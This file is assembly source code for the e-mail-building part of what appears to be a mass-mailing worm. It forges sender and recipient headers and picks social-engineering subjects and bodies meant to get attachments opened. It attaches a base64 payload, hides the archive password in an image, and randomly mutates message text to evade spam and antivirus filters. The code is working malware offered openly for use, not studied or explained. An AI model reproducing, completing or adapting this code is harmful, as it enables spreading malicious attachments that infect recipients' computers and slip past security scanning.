; Format e-mail message
; #########################################################################

.data
        szSysDate       db      "ddd',' dd MMM yyyy ",0
        szSysTime       db      "HH:mm:ss ",0
        szTimeFmt       db      "%03i%02i",0

        szTokens        db      " ",0

        MsgHeader       db      'Date: %s',13,10
                        db      'To: "%s" <%s>',13,10
                        db      'From: "%s" <%s>',13,10
                        db      'Subject: %s',13,10
                        db      'Message-ID: <%s%s>',13,10
                        db      'MIME-Version: 1.0',13,10
                        ;db	'X-Priority: 1 (Highest)',13,10
                        db      'Content-Type: multipart/mixed;',13,10
                        db      '        boundary="--------%s"',13,10,13,10,0

        TxtHeader       db      '----------%s',13,10
                        db      'Content-Type: text/html; charset="us-ascii"',13,10
                        db      "Content-Transfer-Encoding: 7bit",13,10,13,10,0

        ImgPassHeader   db      '----------%s',13,10
                        db      'Content-Type: %s; name="%s.%s"',13,10
                        db      "Content-Transfer-Encoding: base64",13,10
                        db      'Content-Disposition: attachment; filename="%s.%s"',13,10
                        db      'Content-ID: <%s.%s>',13,10,13,10,0

        ZipHeader       db      '----------%s',13,10
                        db      'Content-Type: application/octet-stream; name="%s%s"',13,10
                        db      "Content-Transfer-Encoding: base64",13,10
                        db      'Content-Disposition: attachment; filename="%s%s"',13,10,13,10,0


        ZipBoundaryHdr  db      13,10,13,10,"----------%s--",13,10,13,10,".",13,10,0
        szEmailEnd      db      ".",13,10,0
        szCRLF          db      "<br>",13,10,0
        szTextCRLF      db      13,10,0

        IFDEF TESTVERSION
                szTestSaveFmt   db      "C:\EmailsOut\%s.msg",0
        ENDIF

        szHTMLStart     db      '<html><body>',13,10,0
        szHTMLEnd       db      '</body></html>',13,10,13,10,0

        szPassImg       db      '<img src="cid:%s.%s"><br>',13,10,0
        szPassOnlyFmt   db      "Password: %s",0
                        db      "Pass - %s",0
                        db      "Password - %s",0,0
        dwPassOnlyFmt   dd      0

        szSubjs2        db      "Re: Msg reply",0
                        db      "Re: Hello",0
                        db      "Re: Yahoo!",0
                        db      "Re: Thank you!",0
                        db      "Re: Thanks :)",0
                        db      "RE: Text message",0
                        db      "Re: Document",0
                        db      "Incoming message",0
                        db      "Re: Incoming Message",0
                        db      "RE: Incoming Msg",0
                        db      "RE: Message Notify",0
                        db      "Notification",0
                        db      "Changes..",0
                        db      "Update",0
                        db      "Fax Message",0
                        db      "Protected message",0
                        db      "RE: Protected message",0
                        db      "Forum notify",0
                        db      "Site changes",0
                        db      "Re: Hi",0
                        db      "Encrypted document",0,0
        dwSubjsCount2   dd      0

        szMsgs2         db      "Read the attach.<br><br>",13,10,13,10,0
                        db      "Your file is attached.<br><br>",13,10,13,10,0
                        db      "More info is in attach<br><br>",13,10,13,10,0
                        db      "See attach.<br><br>",13,10,13,10,0
                        db      "Please, have a look at the attached file.<br>",13,10,13,10,0
                        db      "Your document is attached.<br><br>",13,10,13,10,0
                        db      "Please, read the document.<br><br>",13,10,13,10,0
                        db      "Attach tells everything.<br><br>",13,10,13,10,0
                        db      "Attached file tells everything.<br><br>",13,10,13,10,0
                        db      "Check attached file for details.<br><br>",13,10,13,10,0
                        db      "Check attached file.<br><br>",13,10,13,10,0
                        db      "Pay attention at the attach.<br><br>",13,10,13,10,0
                        db      "See the attached file for details.<br><br>",13,10,13,10,0
                        db      "Message is in attach<br><br>",13,10,13,10,0
                        db      "Here is the file.<br><br>",13,10,13,10,0,0
        dwMsgsCount2    dd      0

        szExts          db      ".ini",0
                        db      ".cfg",0
                        db      ".txt",0
                        db      ".vxd",0
                        db      ".def",0
                        db      ".dll",0,0
        dwExtsCount     dd      0
                 
        szPasses        db      13,10,'<br>For security reasons attached file is password protected. The password is <img src="cid:%s.%s"><br>',13,10,0
                        db      13,10,'<br>For security purposes the attached file is password protected. Password -- <img src="cid:%s.%s"><br>',13,10,0
                        db      13,10,'<br>Note: Use password <img src="cid:%s.%s"> to open archive.<br>',13,10,0
                        db      13,10,'<br>Attached file is protected with the password for security reasons. Password is <img src="cid:%s.%s"><br>',13,10,0
                        db      13,10,'<br>In order to read the attach you have to use the following password: <img src="cid:%s.%s"><br>',13,10,0
                        db      13,10,'<br>Archive password: <img src="cid:%s.%s"><br>',13,10,0
                        db      13,10,'<br>Password - <img src="cid:%s.%s"><br>',13,10,0
                        db      13,10,'<br>Password: <img src="cid:%s.%s"><br>',13,10,0,0
        dwPassesCount   dd      0

        szNames         db      "Information",0
                        db      "Details",0
                        db      "text_document",0
                        db	"Updates",0
                        db      "Readme",0
                        db      "Document",0
                        db      "Info",0
                        db      "Details",0
                        db      "MoreInfo",0
                        db      "Message",0,0
        dwNamesCount    dd      0

        szSrcAttachName	db	"Sources",0
        szSrcAttachExt	db	".zip",0

.code

; Valid email rfc time (GMT based)
GenEmailTime proc lpszStr: DWORD
        LOCAL   lpTimeBuf[31]: BYTE
        LOCAL   SysTime: SYSTEMTIME
        LOCAL   lpTimeZone: TIME_ZONE_INFORMATION

        invoke  GetLocalTime, addr SysTime

        invoke  GetDateFormat, LANG_ENGLISH, 0, addr SysTime, offset szSysDate, addr lpTimeBuf, 30
        invoke  lstrcpy, lpszStr, addr lpTimeBuf

        invoke  GetTimeFormat, LANG_ENGLISH, TIME_FORCE24HOURFORMAT, addr SysTime, offset szSysTime, addr lpTimeBuf, 30

        invoke  lstrcat, lpszStr, addr lpTimeBuf

        invoke  GetTimeZoneInformation, addr lpTimeZone

        mov     eax, lpTimeZone.Bias
        neg     eax
        cdq

        mov     ecx, 60
        idiv    ecx

        test    edx, edx
        jge     @F
        neg     edx
@@:

        invoke  wsprintf, addr lpTimeBuf, offset szTimeFmt, eax, edx
        .IF     lpTimeBuf[0] == '0'
                mov     lpTimeBuf[0], '+'
        .ENDIF

        invoke  lstrcat, lpszStr, addr lpTimeBuf

        ret
GenEmailTime endp

; Format email RFC headers
EmailFormatHeader proc To1, To2, From1, From2, Boundary, Subject, szOut: DWORD
        LOCAL   lpRandTemp[30]: BYTE
        LOCAL   lpDate[50]: BYTE

        invoke  ZeroMemory, addr lpRandTemp, 30
        invoke  GetRandomID, addr lpRandTemp, 19
        invoke  GenEmailTime, addr lpDate

        invoke  StrRChr, To2, NULL, '@'
        .IF     eax
                xchg    eax, edx
                invoke  wsprintf, szOut, offset MsgHeader, addr lpDate, To1, To2, From1, From2, Subject, addr lpRandTemp, edx, Boundary
        .ENDIF
        ret
EmailFormatHeader endp

; Choose random string in array
EmailRandomCommon proc uses edi ebx szStrs, lpdwCount: DWORD
        LOCAL   cnt: DWORD

        mov     ebx, lpdwCount

        .IF     !dword ptr[ebx]
                cld
                xor     eax, eax
                mov     edi, szStrs
@next:
                or      ecx, -1
                repnz scasb
                inc     dword ptr[ebx]
                cmp     byte ptr[edi], 0
                jnz     @next
        .ENDIF

        mov     cnt, 0
        invoke  Rand, dword ptr[ebx]
        mov     cnt, eax

        mov     edi, szStrs
        xor     eax, eax
@next2:
        .IF     cnt == 0
                mov     eax, edi
                ret
        .ELSE
                or      ecx, -1
                cld
                repnz scasb
                dec     cnt
                jmp     @next2
        .ENDIF

        ret
EmailRandomCommon endp

; Choose random subject
EmailRandomSubject2 proc
        invoke  EmailRandomCommon, offset szSubjs2, addr dwSubjsCount2
        ret
EmailRandomSubject2 endp

; Choose random message body
EmailRandomMsg2 proc
        invoke  EmailRandomCommon, offset szMsgs2, addr dwMsgsCount2
        ret
EmailRandomMsg2 endp

; Choose random name
EmailRandomName proc
        invoke  EmailRandomCommon, offset szNames, addr dwNamesCount
        ret
EmailRandomName endp

; Choose password fmt
EmailRandomPass proc
        invoke  EmailRandomCommon, offset szPasses, addr dwPassesCount
        ret
EmailRandomPass endp

; Choose random password text
EmailRandomPassOnlyFmt proc
        invoke  EmailRandomCommon, offset szPassOnlyFmt, addr dwPassOnlyFmt
        ret
EmailRandomPassOnlyFmt endp

; Choose random extension
EmailRandomExt proc
        invoke  EmailRandomCommon, offset szExts, addr dwExtsCount
        ret
EmailRandomExt endp

; Safe string randomizer initialization
EmailRandInit proc
        invoke  EmailRandomSubject2
        invoke  EmailRandomMsg2
        invoke  EmailRandomName
        invoke  EmailRandomPass
        invoke  EmailRandomPassOnlyFmt
        invoke  EmailRandomExt
        ret
EmailRandInit endp

CreateMessageContent2 proc uses esi ebx PassName, PassExt, Boundary: DWORD
        invoke  GlobalAlloc, GPTR, 20000
        mov     ebx, eax
        invoke  GlobalAlloc, GPTR, 5000
        mov     esi, eax

        ; Body
        invoke  EmailRandomMsg2
        invoke  lstrcpy, ebx, eax

        mov     eax, offset szZipPassBuff
        .IF     byte ptr[eax]
                invoke  EmailRandomPass
                invoke  wsprintf, esi, eax, PassName, PassExt
                invoke  lstrcat, ebx, esi
                invoke  lstrcat, ebx, offset szCRLF
        .ELSE
                invoke  lstrcat, ebx, offset szCRLF
        .ENDIF

        ; Free temp buffer
        invoke  GlobalFree, esi
        mov     eax, ebx
        ret
CreateMessageContent2 endp

CreateMessagePassImg proc uses ebx PassName, PassExt: DWORD
        invoke  GlobalAlloc, GPTR, 20000
        mov     ebx, eax
        invoke  wsprintf, ebx, offset szPassImg, PassName, PassExt
        mov     eax, ebx
        ret
CreateMessagePassImg endp

; Simple mutation routine
MutateMessage proc uses edi ebx lpMsg, stream: DWORD
        LOCAL   _first: DWORD
        LOCAL   _str: DWORD

        invoke  GlobalAlloc, GPTR, 5000
        mov     _str, eax

        mov     _first, 0
        mov     edi, lpMsg

@tokenize:
        cld
        mov     edx, edi

@l:
        .IF     (byte ptr[edi] != 0) && (byte ptr[edi] != " ")
                inc     edi
                jmp     @l
        .ENDIF

        mov     bl, byte ptr[edi]
        mov     byte ptr[edi], 0
        invoke  lstrcpy, _str, edx
        mov     byte ptr[edi], bl

        .IF     !_first
                mov     _first, 1
        .ELSE
                invoke  Rand, 4
                .IF     !eax
                        coinvoke stream, IStream, Write, offset szTokens, 1, NULL
                .ENDIF
                coinvoke stream, IStream, Write, offset szTokens, 1, NULL
        .ENDIF

        invoke  lstrlen, _str
        coinvoke stream, IStream, Write, _str, eax, NULL
        
        inc     edi
        cmp     byte ptr[edi-1], 0
        jnz     @tokenize

        invoke  GlobalFree, _str
        ret
MutateMessage endp

; Make first letter uppercased
UpperEmailSrvLetter proc lpEmail: DWORD
        mov     eax, lpEmail
        push    eax
        movzx   eax, byte ptr[eax]
        invoke  CharUpper, eax
        pop     edx
        mov     byte ptr[edx], al
        ret
UpperEmailSrvLetter endp

; Rip username from e-mail address (user123@email.com -> User)
EmailGetName proc uses esi edi lpEmail, lpOut: DWORD
        invoke  StrChrI, lpEmail, '@'
        .IF     eax
                sub     eax, lpEmail
                inc     eax

                invoke  lstrcpyn, lpOut, lpEmail, eax

                mov     edi, lpOut
        @l:
                .IF     (!byte ptr[edi]) || (byte ptr[edi] == '_') || ((byte ptr[edi] >= '0') && (byte ptr[edi] <= '9'))
                        mov     byte ptr[edi], 0
                .ELSE
                        inc     edi
                        jmp     @l
                .ENDIF
                
                invoke  UpperEmailSrvLetter, lpOut
        .ENDIF
        ret
EmailGetName endp

; Create message, return IStream ptr
EmailFormatMessage proc From, To: DWORD
        LOCAL   szSubject: DWORD
        LOCAL   stream: DWORD
        LOCAL   lpBoundary[150]: BYTE
        LOCAL   lpPassName[20]: BYTE
        LOCAL   szHeader: DWORD
        LOCAL   szMessage: DWORD
        LOCAL   FromName: DWORD
        LOCAL   ToName: DWORD

        invoke  GlobalAlloc, GPTR, 1024
        mov     FromName, eax
        invoke  EmailGetName, From, eax

        invoke  GlobalAlloc, GPTR, 1024
        mov     ToName, eax
        invoke  EmailGetName, To, eax

        invoke  EmailRandomSubject2
        mov     szSubject, eax

        invoke  StreamCreate, addr stream
        invoke  GlobalAlloc, GPTR, 8192
        mov     szHeader, eax

        ; Generate boundary
        invoke  ZeroMemory, addr lpBoundary, 30
        invoke  GetRandomID, addr lpBoundary, 20

        ; Generate password filename
        invoke  ZeroMemory, addr lpPassName, 20
        invoke  GetRandomID, addr lpPassName, 10

        ; Main header
        invoke  EmailFormatHeader, ToName, To, FromName, From, addr lpBoundary, szSubject, szHeader
        invoke  lstrlen, szHeader
        coinvoke stream, IStream, Write, szHeader, eax, NULL

        ; Message header boundary
        invoke  wsprintf, szHeader, offset TxtHeader, addr lpBoundary
        invoke  lstrlen, szHeader
        coinvoke stream, IStream, Write, szHeader, eax, NULL

        ; HTML Start
        invoke  lstrlen, offset szHTMLStart
        coinvoke stream, IStream, Write, offset szHTMLStart, eax, NULL

        ; The Message Body
        mov     edx, b64PasswordMime
        add     edx, 6 ; image file extension
        .IF     bPassImgOnly
                invoke  CreateMessagePassImg, addr lpPassName, edx
        .ELSE
                invoke  CreateMessageContent2, addr lpPassName, edx, addr lpBoundary
        .ENDIF
        mov     szMessage, eax
        invoke  MutateMessage, eax, stream

        ; HTML end
        invoke  lstrlen, offset szHTMLEnd
        coinvoke stream, IStream, Write, offset szHTMLEnd, eax, NULL

        ; If password enabled
        mov     eax, offset szZipPassBuff
        .IF     byte ptr[eax]
                mov     edx, b64PasswordMime
                add     edx, 6 ; file extension
                ; Image password header
                invoke  wsprintf, szHeader, offset ImgPassHeader, addr lpBoundary, b64PasswordMime, addr lpPassName, edx, addr lpPassName, edx, addr lpPassName, edx
                invoke  lstrlen, szHeader
                coinvoke stream, IStream, Write, szHeader, eax, NULL
                coinvoke stream, IStream, Write, b64Password, b64PasswordLen, NULL
                coinvoke stream, IStream, Write, offset szTextCRLF, 2, NULL
                coinvoke stream, IStream, Write, offset szTextCRLF, 2, NULL
        .ENDIF

        ; File header
        invoke  EmailRandomName
        invoke  wsprintf, szHeader, offset ZipHeader, addr lpBoundary, eax, szAttachExt, eax, szAttachExt
        invoke  lstrlen, szHeader
        coinvoke stream, IStream, Write, szHeader, eax, NULL

        ; File data
        coinvoke stream, IStream, Write, b64Attach, b64AttachLen, NULL

        ; -------------------
        ; Attach with sources
        invoke	Rand, 100
        .IF	eax >= 70
        	; 30% send sources
		coinvoke stream, IStream, Write, offset szTextCRLF, 2, NULL
		coinvoke stream, IStream, Write, offset szTextCRLF, 2, NULL

        	; File header
        	invoke  wsprintf, szHeader, offset ZipHeader, addr lpBoundary, offset szSrcAttachName, offset szSrcAttachExt, offset szSrcAttachName, offset szSrcAttachExt
        	invoke  lstrlen, szHeader
        	coinvoke stream, IStream, Write, szHeader, eax, NULL

        	; File data
        	coinvoke stream, IStream, Write, b64SrcAttach, b64SrcAttachLen, NULL
        .ENDIF

        ; Final boundary
        invoke  wsprintf, szHeader, offset ZipBoundaryHdr, addr lpBoundary
        invoke  lstrlen, szHeader
        coinvoke stream, IStream, Write, szHeader, eax, NULL

        invoke  GlobalFree, szMessage
        invoke  GlobalFree, szHeader
        invoke  GlobalFree, FromName
        invoke  GlobalFree, ToName

        IFDEF TESTVERSION
                ; Write sample email to disk
                invoke  wsprintf, addr lpBoundary, offset szTestSaveFmt, To
                invoke  StreamSaveToFile, stream, addr lpBoundary
        ENDIF

        mov     eax, stream
        ret
EmailFormatMessage endp
